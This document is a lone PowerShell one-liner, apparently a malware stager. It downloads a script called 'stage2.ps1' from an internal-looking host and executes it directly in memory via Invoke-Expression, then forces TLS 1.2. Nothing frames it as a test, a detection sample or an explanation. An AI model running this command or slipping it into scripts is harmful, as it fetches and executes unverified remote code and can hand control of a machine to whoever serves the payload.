Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://internal.corp/stage2.ps1"); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
